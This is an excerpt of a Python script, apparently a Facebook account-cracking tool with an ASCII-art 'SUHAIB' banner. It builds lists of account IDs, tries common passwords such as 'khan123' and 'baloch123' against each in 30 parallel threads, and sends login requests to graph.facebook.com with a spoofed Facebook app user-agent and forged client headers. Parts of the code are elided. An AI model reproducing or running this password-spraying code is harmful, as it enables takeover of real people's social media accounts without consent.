...
\33[1;96m\33[1;91m$$\   $$ |$$ |  $$ |$$ |  $$ |  $$ |  
\33[1;97m\$$$$$$  | $$$$$$  |$$ |  $$ |$$$$$$\ 
 \33[1;92m\______/  \______/ \__|  \__|\______|  
                       \33[;92m Pro
  \33[;97m
              \033[41m\033[1;37m[THE]   [BRAND]   [SUHAIB]  \x1b[0m  
=======================================================
\033[;37m\033[;97m         Facebook       \033[;37m\033[;92m  : M SUHAIB
\033[;37m\033[;97m         Version          \033[;37m\033[;92m: 0.1  
\033[;37m=======================================================
...
def pak():
                ...
                with tred(max_workers=30) as TRT:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan123','khan12345','ali12345','baloch123']
...
def ffb(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua  = "[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/*{density=1.3312501,width=800,eight=1280};FBLC/zh_TW;FBCR/F;FBMF/sumsung;FBBD/sumsung;FBPN/com.facebook.katana;FBDV/GT-N5100;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]"
                        ...
                        headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "23166","X-FB-SIM-HNI": "35605","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "authenticat","X-FB-Connection-Bandwidth": "26061","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-SK-OK"}
...
'X-FB-Connection-Bandwidth': '26061',
